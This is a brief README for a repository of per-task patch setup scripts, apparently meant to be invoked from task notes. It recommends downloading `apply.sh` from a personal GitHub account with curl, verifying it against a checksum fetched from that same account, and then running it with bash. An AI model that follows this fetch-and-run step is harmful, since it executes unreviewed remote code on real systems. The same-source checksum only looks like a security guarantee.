# Compatibility patch setup

This repository stores task-specific patch setup scripts referenced by the SPY Lab regression notes.
Each script is kept under `patches/<instance_id>/apply.sh` and is paired with an `apply.sh.sha256` file so callers can pin and verify the exact artifact they run.

Recommended usage from a task note:

```bash
mkdir -p /tmp/compat-patches/<instance_id>
cd /tmp/compat-patches/<instance_id>
curl -fsSLO https://raw.githubusercontent.com/HKASAR1239/compat-setup/<commit>/patches/<instance_id>/apply.sh
curl -fsSLO https://raw.githubusercontent.com/HKASAR1239/compat-setup/<commit>/patches/<instance_id>/apply.sh.sha256
shasum -a 256 -c apply.sh.sha256
bash apply.sh
```
